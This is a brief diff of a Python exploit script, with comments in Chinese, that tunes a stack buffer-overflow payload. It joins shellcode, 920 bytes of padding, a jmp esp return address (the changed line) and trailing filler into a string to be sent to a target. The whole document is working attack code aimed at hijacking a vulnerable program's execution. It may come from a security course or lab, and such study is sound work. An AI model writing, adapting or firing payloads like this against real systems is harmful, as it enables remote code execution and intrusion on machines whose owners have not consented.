@@ -14,7 +14,7 @@ shellcode = b'\x55\x8B\xEC\x33\xFF\x57\x83\xEC\x0C\xC6\x45\xF0\x6E\xC6\x45\xF1\x
 # 为了覆盖返回地址的填充
 padding = b'a'*920                
 #jmpesp = b'\x12\x45\xf1\x7'     # 指向jmp esp指令的地址0x7ffa4512覆盖ret
-jmpesp = b'\x78\x16\x96\x7c'
+jmpesp = b'\x78\x16\x96\x77'
 # 末尾至少填充16个字符
 sendStr = sendStr+jmp+shellcode+padding+jmpesp +b'a'*16
 
